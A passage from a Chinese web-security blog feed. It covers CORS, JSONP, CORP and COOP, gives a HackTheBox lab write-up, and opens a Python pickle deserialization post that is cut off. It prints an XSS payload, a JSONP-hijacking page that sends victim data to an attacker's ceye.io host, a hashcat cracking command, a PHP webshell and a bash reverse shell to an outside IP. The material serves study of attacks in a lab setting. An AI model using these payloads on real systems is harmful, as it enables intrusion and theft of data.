协议，使得服务器能够声明哪些源站可以访问该服务器上的资源。在 CORS 中，HTTP 请求由两种类型：</p><ol><li><p><strong>简单请求（Simple Requests）</strong>：</p><ul><li>使用 GET、HEAD 或 POST 方法。</li><li>POST 方法的 <code>Content-Type</code> 仅限于 <code>text/plain</code>、<code>multipart/form-data</code> 和 <code>application/x-www-form-urlencoded</code>。</li><li>不会改变服务器状态的请求被视为简单请求。</li></ul><p>简单请求的 CORS 流程：</p><ul><li>浏览器在简单请求的头部中自动添加 <code>Origin</code> 字段，这个字段标明请求来自哪个源（协议+域名+端口）。</li><li>服务器根据这个源决定是否允许请求。如果允许，服务器会在响应头中添加 <code>Access-Control-Allow-Origin</code>。浏览器只有在收到这个头部，并且值与请求的源相匹配，或者是通配符 <code>*</code> 时，才会处理响应。如果不允许，服务器不会添加该字段，浏览器也会阻止应用访问该响应。</li></ul></li><li><p><strong>预检请求（Preflight Requests）</strong>：</p><ul><li>使用了除 GET、HEAD、POST 之外的 HTTP 方法。</li><li>发送了除简单请求头之外的自定义头，如 <code>application/json</code>。</li><li>对服务器有特定影响的 POST 请求（如发送 JSON 或 XML 数据）。</li></ul><p>预检请求的 CORS 流程：</p><ul><li>在发送实际请求前，浏览器首先会发送一个 OPTIONS 请求到服务器，询问服务器是否允许跨域请求。</li><li>这个 OPTIONS 预检请求包括以下头信息：<code>Origin</code>、<code>Access-Control-Request-Method</code>（实际请求中将使用的 HTTP 方法）和 <code>Access-Control-Request-Headers</code>（实际请求中将设置的自定义头信息）。</li><li>如果服务器允许，它会在响应中包括如 <code>Access-Control-Allow-Methods</code>、<code>Access-Control-Allow-Headers</code>、<code>Access-Control-Allow-Origin</code> 等头部，明确允许的方法、头部和源。</li><li>浏览器接收到允许的响应后，会发送实际的 HTTP 请求。</li></ul></li></ol><h3 id="CORS-响应头部"><a href="#CORS-响应头部" class="headerlink" title="CORS 响应头部"></a>CORS 响应头部</h3><ul><li>**<code>Access-Control-Allow-Origin</code>**：指定哪些域可以访问域资源。例如，如果requester.com 想要访问 provider.com 的资源，那么开发人员可以使用此标头安全地授予 requester.com 对 provider.com 资源的访问权限。</li><li>**<code>Access-Control-Allow-Methods</code>**：指定可以使用哪些 HTTP 请求方法（GET，PUT，DELETE 等）来访问资源。此标头允许开发人员通过在 requester.com 请求访问provider.com 的资源时，指定哪些方法有效来进一步增强安全性。</li><li>**<code>Access-Control-Allow-Headers</code>**：允许的 HTTP 请求头。</li><li>**<code>Access-Control-Allow-Credentials</code>**：指定浏览器是否将使用请求发送 cookie。仅当 allow-credentials 标头设置为 true 时，才会发送 Cookie。</li></ul><h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS">使用场景</a></h3><p>CORS 非常适用于单页应用（SPA），这些应用通常会从多个源加载资源。CORS 也是实现 API 服务和前端分离的关键技术之一，使得前端应用可以安全地从不同源获取数据和资源。<br>SpringCloud设置跨域</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GatewayCorsConfiguation</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> CorsFilter <span class="title function_">corsFilter</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">// 初始化cors配置对象</span></span><br><span class="line">        <span class="type">CorsConfiguration</span> <span class="variable">configuration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CorsConfiguration</span>();</span><br><span class="line">        configuration.setAllowCredentials(<span class="literal">true</span>); <span class="comment">// 允许使用cookie，但是使用cookie是addAllowedOrigin必须是具体的地址，不能是*</span></span><br><span class="line"><span class="comment">//        configuration.addAllowedOrigin(&quot;*&quot;);</span></span><br><span class="line">        configuration.addAllowedOrigin(<span class="string">&quot;http://manage.leyou.com&quot;</span>);</span><br><span class="line">        configuration.addAllowedMethod(<span class="string">&quot;*&quot;</span>);  <span class="comment">//允许的请求方式,get,put,post,delete</span></span><br><span class="line">        configuration.addAllowedHeader(<span class="string">&quot;*&quot;</span>);<span class="comment">//允许的头信息</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">//初始化cors的源对象配置</span></span><br><span class="line">        <span class="type">UrlBasedCorsConfigurationSource</span> <span class="variable">corsConfigurationSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UrlBasedCorsConfigurationSource</span>();</span><br><span class="line">        corsConfigurationSource.registerCorsConfiguration(<span class="string">&quot;/**&quot;</span>,configuration);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//3.返回新的CorsFilter.</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">CorsFilter</span>(corsConfigurationSource);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h3><ul><li>CORS 政策完全由服务器端控制。如果服务器配置不当，可能会导致敏感信息泄露。</li><li><code>Access-Control-Allow-Origin</code> 设置为 <code>*</code> 可以允许所有域名的访问，但这通常不推荐用于处理敏感数据。<br>可以使用这个工具做一些检测 <a href="https://github.com/chenjj/CORScanner">https://github.com/chenjj/CORScanner</a></li></ul><h2 id="JSONP（JSON-with-Padding）"><a href="#JSONP（JSON-with-Padding）" class="headerlink" title="JSONP（JSON with Padding）"></a>JSONP（JSON with Padding）</h2><p>JSONP 教程   <a href="https://www.runoob.com/json/json-jsonp.html">https://www.runoob.com/json/json-jsonp.html</a><br><img src="/2024/09/20/WebSecurity/owasptop/browserorigin/image-2.png"><br>JSONP（JSON with Padding）是一种跨域数据交换的技术，它利用了<code>&lt;script&gt;</code>标签没有跨域限制的特性来发送跨域请求，现在的应用很少。<code>callback</code>是一个很有效的关键词，通过在网络请求中检索callback，或许可以找到应用的点，如果返回的json是隐私相关的信息，那么就可以实现信息泄漏等。</p><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>JSONP 的工作原理基于以下两个事实：</p><ol><li>浏览器的同源策略阻止了从不同源加载的脚本访问其他源的 DOM 和 JavaScript 对象，但不禁止向其他源发送<code>&lt;script&gt;</code>标签的请求。</li><li><code>&lt;script&gt;</code>标签的<code>src</code>属性可以用来加载任何来源的 JavaScript 文件。</li></ol><p>当需要从其他域名获取数据时，可以使用 JSONP 方法。这种方式通常涉及到下面几个步骤：</p><ol><li><strong>客户端定义回调函数</strong>：首先在客户端定义一个回调函数，这个函数将处理从服务器获取的数据。</li><li><strong>动态创建 <code>&lt;script&gt;</code> 标签</strong>：然后通过动态创建 <code>&lt;script&gt;</code> 标签的方式来发送请求，请求的 URL 包含一个查询参数，通常是 <code>callback</code>，其值是上一步定义的回调函数的名称。</li><li><strong>服务器响应</strong>：服务器在接收到请求后，会生成 JSON 数据，并将这个数据作为参数传递给查询参数中指定的回调函数，形成一段可执行的 JavaScript 代码。</li><li><strong>执行响应</strong>：当这段带有数据的 JavaScript 代码通过 <code>&lt;script&gt;</code> 标签加载并执行时，定义的回调函数会被调用，并且实际的数据会作为参数传入。</li></ol><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>假设有一个客户端回调函数 <code>handleResponse</code>，你希望从 <code>http://example.com/api</code> 获取数据，你可以这样实现 JSONP 请求：<br><strong>客户端代码</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">handleResponse</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Received data: &quot;</span> + data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">script.<span class="property">src</span> = <span class="string">&#x27;http://example.com/api?callback=handleResponse&#x27;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script);</span><br></pre></td></tr></table></figure><p><strong>服务器端响应</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">handleResponse</span>(&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">25</span>&#125;);</span><br></pre></td></tr></table></figure><p>这段响应是一个 JavaScript 代码，调用了客户端定义的 <code>handleResponse</code> 函数，并传入了数据。</p><h3 id="安全考虑"><a href="#安全考虑" class="headerlink" title="安全考虑"></a>安全考虑</h3><p>1、对于输入的callback函数名过滤不严格，导致输入的数据直接输出到前端造成XSS<br>2、JSONP劫持漏洞，由于对于来源域没有严格限制，因此来源于不安全的域的请求也会被响应<br>随着 CORS（跨源资源共享）标准的普及，JSONP 的使用越来越少。CORS 提供了一种更安全、更灵活的跨域请求方式，允许服务器更精细地控制哪些网站可以访问哪些资源，同时支持所有类型的 HTTP 请求（不仅仅是 GET 请求），而 JSONP 仅支持 GET 请求。因此，在现代 Web 应用开发中，推荐使用 CORS 而不是 JSONP。</p><p>直接构造xss：<code>http://xxxxxx/jsonp/index.php?callback=jsonp_5981%3Cimg%20src=x%20onerror=alert(/xss/)%3E</code>，可以获取到用户的cookie信息或者劫持用户跳转到钓鱼网站<br>JSONP劫持：JSONP劫持，实质上算是一种读类型的CSRF，在恶意的网页中构造恶意的JS代码，当合法用户点击该网页，由于目标站点存在JSONP劫持漏洞的接口，因此会将用户的该接口对应的信息劫持，并将其发送到攻击者的服务器。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>jsonp劫持<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">jsonp_hack</span>(<span class="params">v</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(<span class="string">&quot;jsonp劫持&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> h=<span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> v)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> a=<span class="string">&#x27;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        a=key+<span class="string">&#x27; : &#x27;</span>+v[key]+<span class="string">&#x27; ,&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        h+=a</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(h);</span></span><br><span class="line"><span class="language-javascript">    $.<span class="title function_">get</span>(<span class="string">&#x27;http://jsonp1.kijkv0.ceye.io?value=&#x27;</span>+h);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://172.16.31.149/jsonp/index.php?callback=jsonp_hack&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>jsonp劫持<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>一旦被攻击者访问该网页，就会自动触发，会自动访问具有漏洞的jsonp接口，利用被攻击者自己的session获取到被攻击者的信息，并将该信息远程发送到攻击者的服务器上</p><h2 id="其他解决跨域问题的方案"><a href="#其他解决跨域问题的方案" class="headerlink" title="其他解决跨域问题的方案"></a><a href="https://blog.csdn.net/qq_51383106/article/details/131458419">其他解决跨域问题的方案</a></h2><p>利用nginx进行反向代理，在一个服务器上配置多个前缀来转发http&#x2F;https请求到多个真实的服务器即可。在 nginx 中配置反向代理服务器，将客户端的请求转发到后端服务器，并在转发过程中添加相应的响应头。例如，假设前端服务器运行在 <a href="http://frontend.example.com,后端服务器运行在/">http://frontend.example.com，后端服务器运行在</a> <a href="http://backend.example.com,则可以在/">http://backend.example.com，则可以在</a> nginx 中配置如下的反向代理服务器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name frontend.example.com;</span><br><span class="line"></span><br><span class="line">    location /api &#123;</span><br><span class="line">        proxy_pass http://backend.example.com;</span><br><span class="line">        add_header Access-Control-Allow-Origin http://frontend.example.com;</span><br><span class="line">        add_header Access-Control-Allow-Credentials true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述配置中，location &#x2F;api 将客户端请求中的 &#x2F;api 转发到后端服务器的对应接口。<br>add_header Access-Control-Allow-Origin <a href="http://frontend.example.com/">http://frontend.example.com</a> 表示允许来自 <a href="http://frontend.example.com/">http://frontend.example.com</a> 的跨域请求。<br>add_header Access-Control-Allow-Credentials true 表示允许跨域请求携带 cookie。<br>设置相应的响应头在响应头中添加相应的跨域设置，以允许客户端发送跨域请求和携带 cookie。例如，添加 Access-Control-Allow-Origin 和 Access-Control-Allow-Credentials 头部：Access-Control-Allow-Origin: <a href="http://frontend.example.com/">http://frontend.example.com</a><br>Access-Control-Allow-Credentials: true这样客户端在向后端服务器发送请求时，就能携带 cookie，并允许跨域请求。</p><p>还有很多前端跨域解决方案：<a href="https://blog.csdn.net/jined/article/details/120693745">https://blog.csdn.net/jined/article/details/120693745</a></p><h2 id="新的安全措施-CORP-COOP"><a href="#新的安全措施-CORP-COOP" class="headerlink" title="新的安全措施 CORP COOP"></a>新的安全措施 CORP COOP</h2><p><a href="https://www.cnblogs.com/Yangyecool/p/13417794.html">https://www.cnblogs.com/Yangyecool/p/13417794.html</a><br><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cross-Origin_Resource_Policy">https://developer.mozilla.org/en-US/docs/Web/HTTP/Cross-Origin_Resource_Policy</a><br>在现代浏览器安全中，除了CORS以外，还有两个相对较新的安全策略，分别是CORP（Cross-Origin Resource Policy）和COOP（Cross-Origin Opener Policy）。这两种策略都是为了进一步加强跨域安全，尤其是在防止某些类型的跨站攻击（如跨站脚本和跨站请求伪造）和数据泄露方面。<br>同源策略也有一些例外，任何网站都可以不受限制的加载下面的资源：</p><ul><li>嵌入跨域 iframe</li><li>image、script 等资源</li><li>使用 DOM 打开跨域弹出窗口<br>对于这些资源，浏览器可以将各个站点的跨域资源分隔在不同的 Context Group 下，不同的 Context Group 下资源无法相互访问。<br>浏览器 Context Group 是一组共享相同上下文的 tab、window或iframe。例如，如果网站（<a href="https://a.example)打开弹出窗口(https//b.example%EF%BC%89%EF%BC%8C%E5%88%99%E6%89%93%E5%BC%80%E5%99%A8%E7%AA%97%E5%8F%A3%E5%92%8C%E5%BC%B9%E5%87%BA%E7%AA%97%E5%8F%A3%E5%85%B1%E4%BA%AB%E7%9B%B8%E5%90%8C%E7%9A%84%E6%B5%8F%E8%A7%88%E4%B8%8A%E4%B8%8B%E6%96%87%EF%BC%8C%E5%B9%B6%E4%B8%94%E5%AE%83%E4%BB%AC%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87">https://a.example）打开弹出窗口（https://b.example），则打开器窗口和弹出窗口共享相同的浏览上下文，并且它们可以通过</a> DOM API相互访问，例如 window.opener。</li></ul><p>长久以来，这些安全策略一直保护着网站的隐私数据，直到 Spectre 漏洞出现。Spectre 是一个在 CPU 中被发现的漏洞，利用 Spectre ，攻击者可以读取到在统一浏览器下任意 Context Group 下的资源。特别是在使用一些需要和计算机硬件进行交互的 API 时：</p><ul><li>SharedArrayBuffer (required for WebAssembly Threads)</li><li>performance.measureMemory()</li><li>JS Self-Profiling API<br>为此，浏览器一度禁用了 SharedArrayBuffer 等高风险的 API。</li></ul><h3 id="CORP（Cross-Origin-Resource-Policy）"><a href="#CORP（Cross-Origin-Resource-Policy）" class="headerlink" title="CORP（Cross-Origin Resource Policy）"></a>CORP（Cross-Origin Resource Policy）</h3><p><strong>CORP</strong> 是一种浏览器安全策略，允许开发者限制哪些跨源请求可以加载资源。这个策略主要是通过 HTTP 响应头 <code>Cross-Origin-Resource-Policy</code> 实现的，可以控制资源（如图像、CSS、JavaScript等）是否可以被另一个域加载。</p><p><strong>使用场景</strong>：<br>CORP 主要用于防止资源被不同源的网站读取或嵌入。例如，一个网站可以决定其资源只能由同源网站或特定的源网站加载。<br><strong>响应头选项</strong>：</p><ul><li><code>Cross-Origin-Resource-Policy: same-origin</code>：只有同源的站点可以加载资源。</li><li><code>Cross-Origin-Resource-Policy: same-site</code>：只有相同站点（即顶级域名相同）的请求可以加载资源。</li><li><code>Cross-Origin-Resource-Policy: cross-origin</code>：任何网站都可以加载资源。这相当于没有应用任何CORP。</li></ul><h3 id="COOP（Cross-Origin-Opener-Policy）"><a href="#COOP（Cross-Origin-Opener-Policy）" class="headerlink" title="COOP（Cross-Origin Opener Policy）"></a>COOP（Cross-Origin Opener Policy）</h3><p><strong>COOP</strong> 是一种浏览器安全策略，用于隔离来自不同源的浏览器上下文（如窗口和标签页），从而防止潜在的恶意文档影响正常文档，或在两者之间进行数据泄露。这个策略主要通过 HTTP 响应头 <code>Cross-Origin-Opener-Policy</code> 来设置。</p><p><strong>使用场景</strong>：<br>COOP 主要用于创建一个安全的环境，其中的页面不会与不同源的页面共享相同的进程，因此可以阻止恶意网站通过窗口间通信（如 <code>window.opener</code>）来泄露信息或进行攻击。<br><strong>响应头选项</strong>：</p><ul><li><code>Cross-Origin-Opener-Policy: same-origin</code>：只有同源的页面才能与当前页面共享同一个浏览器进程。</li><li><code>Cross-Origin-Opener-Policy: same-origin-allow-popups</code>：与 <code>same-origin</code> 相同，但允许弹出窗口（由当前页面创建）与其共享同一个进程。</li><li><code>Cross-Origin-Opener-Policy: unsafe-none</code>：不隔离源，所有页面共享同一进程，这是大多数页面的默认行为。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【hackthebox】解题记录</title>
      <link href="/2024/09/19/WebSecurity/ctf/hackthebox/"/>
      <url>/2024/09/19/WebSecurity/ctf/hackthebox/</url>
      
        <content type="html"><![CDATA[<h2 id="Sightless"><a href="#Sightless" class="headerlink" title="Sightless"></a>Sightless</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>先用nmap扫描一下：<code>nmap -sC -sV 10.10.11.32 -T4 -oN nmap.txt</code><br><img src="/2024/09/19/WebSecurity/ctf/hackthebox/image.png" alt="端口开放"><br>发现有web服务，访问web页面。另外存在ftp和ssh服务，这些都可能是后面的突破点，先看下web服务。<br><img src="/2024/09/19/WebSecurity/ctf/hackthebox/image-1.png" alt="Unknown host"><br>需要修改下host文件了，添加一行 <code>10.10.11.32 sightless.htb</code><br>访问<code>http://sightless.htb</code><br>页面中只有一个SQLPad是有用的，我们访问这个页面（仍然需要修改host文件）<br><img src="/2024/09/19/WebSecurity/ctf/hackthebox/image-2.png" alt="SQLPad"><br>首先想到的是SQLPad应该是会有一些CVE在的，百度搜一下发现有个<br><img src="/2024/09/19/WebSecurity/ctf/hackthebox/image-3.png" alt="CVE"><br>刚好和当前的版本是一致的</p><p>太寄了<br><a href="https://medium.com/@vikram1337/sightless-hackthebox-9599be0ee25b">https://medium.com/@vikram1337/sightless-hackthebox-9599be0ee25b</a></p><h3 id="GreenHorn"><a href="#GreenHorn" class="headerlink" title="GreenHorn"></a>GreenHorn</h3><p><a href="https://blog.csdn.net/zegeai/article/details/122660540">https://blog.csdn.net/zegeai/article/details/122660540</a><br><a href="https://blog.csdn.net/weixin_63279914/article/details/142436931">https://blog.csdn.net/weixin_63279914/article/details/142436931</a><br><a href="https://blog.csdn.net/qq_23003811/article/details/140635016">https://blog.csdn.net/qq_23003811/article/details/140635016</a></p><p>还是常规的先进行信息搜集，探测下端口<br><img src="/2024/09/19/WebSecurity/ctf/hackthebox/image-4.png"><br>80、3000、9001都开放了，访问web服务（修改host）<br><img src="/2024/09/19/WebSecurity/ctf/hackthebox/image-5.png" alt="看上去是个论坛"><br>进一步搜集发现数据包中有cms信息指纹：pluck 4.7.18，百度了下有CVE漏洞，是文件上传的命令执行，但需要首先登录到后台，尝试猜了下密码，失败了。<br>还有两个端口没看，试试看有没有新思路，访问3000端口，看上去是一个类似git的内部版本控制平台，注册账号进入后发现有套源代码，就是上面的pluck<br><img src="/2024/09/19/WebSecurity/ctf/hackthebox/image-6.png"><br>下载分析，直接看login.php，有相应的登陆逻辑</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pass</span> = <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;sha512&#x27;</span>, <span class="variable">$cont1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$pass</span> == <span class="variable">$ww</span>) &amp;&amp; (!<span class="keyword">isset</span>(<span class="variable">$login_error</span>))) &#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$token</span>] = <span class="string">&#x27;pluck_loggedin&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Delete loginattempt file, if it exists.</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(LOGIN_ATTEMPT_FILE))</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(LOGIN_ATTEMPT_FILE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Display success message.</span></span><br><span class="line"><span class="title function_ invoke__">show_error</span>(<span class="variable">$lang</span>[<span class="string">&#x27;login&#x27;</span>][<span class="string">&#x27;correct&#x27;</span>], <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;pluck_before&#x27;</span>]))</span><br><span class="line"><span class="title function_ invoke__">redirect</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;pluck_before&#x27;</span>], <span class="number">1</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;admin.php?action=start&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;data/inc/footer.php&#x27;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>全局检索 <code>$ww</code> ctrl+shift+F 发现密码硬编码在文件中，是经过sha512哈希后的。<br>网上查了下，可以用hashcat爆破下，用到了kali自带的字典 <code>wordlists/rockyou.txt</code>爆破语句如下<br><code>hashcat -a 0 -m 1700 &#39;d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163&#39; /usr/share/wordlists/rockyou.txt</code><br>上面的命令是使用hashcat，一个广泛使用的密码恢复工具，来尝试破解哈希值。hashcat 支持多种加密算法，并能利用CPU和GPU的强大力量来加速密码的恢复过程。这里是命令的详细解析：</p><ul><li><code>-a 0</code>: 这个选项指定了攻击模式，<code>0</code>代表直接字典攻击。在这种模式下，hashcat 会使用一个字典文件中的每一个词条来生成哈希，然后与给定的哈希值进行比较。</li><li><code>-m 1700</code>: 这个选项指定了哈希类型，<code>1700</code>代表SHA-512算法。hashcat 支持多种哈希算法，每种算法都有一个独特的代码。</li><li><code>/usr/share/wordlists/rockyou.txt</code>: 这是字典文件的路径。<code>rockyou.txt</code>是一个非常著名的密码字典，包含了数百万常用密码，这些密码是从历史数据泄露中汇编而成。hashcat 将使用这个文件中的每一个词条作为输入，生成哈希值，并检查是否与目标哈希值匹配。<br><img src="/2024/09/19/WebSecurity/ctf/hackthebox/image-7.png"><br>根据输出结果可以判断成功爆破出密码：iloveyou1，成功登陆后台。<br><img src="/2024/09/19/WebSecurity/ctf/hackthebox/image-8.png"><br>利用pluck的漏洞，构造文件phpinfo.php，<code>&lt;?php phpinfo();system($_GET[cmd]);?&gt;</code>，并压缩成压缩包，phpinfo.zip。上传之后自动跳转<br><img src="/2024/09/19/WebSecurity/ctf/hackthebox/image-9.png"><br><img src="/2024/09/19/WebSecurity/ctf/hackthebox/image-10.png" alt="成功看到phpinfo界面"><br>但后续按照上面的博客继续尝试，发现不能执行命令，被拦截了，尝试直接反弹shell：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/106.54.6.xxx/4444 0&gt;&amp;1&#x27; &quot;); ?&gt;</span><br><span class="line">zip rev.zip rev.php </span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Web安全】反序列化漏洞分析笔记 - 第三部分 Python反序列化分析</title>
      <link href="/2024/09/18/WebSecurity/owasptop/pythondeserialization-md/"/>
      <url>/2024/09/18/WebSecurity/owasptop/pythondeserialization-md/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>Python的序列化和PHP的很像</p><p>Python序列化相关函数：<br>pickle.dump(obj, file) : 将对象序列化后保存到文件<br>pickle.load(file) : 读取文件， 将文件中的序列化内容反序列化为对象<br>pickle.dumps(obj) : 将对象序列化成字符串格式的字节流<br>pickle.loads(bytes_obj) : 将字符串格式的字节流反序列化为对象</p><p>同样，在Python中也存在魔术方法：<br><code>__reduce__()</code>反序列化时调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span 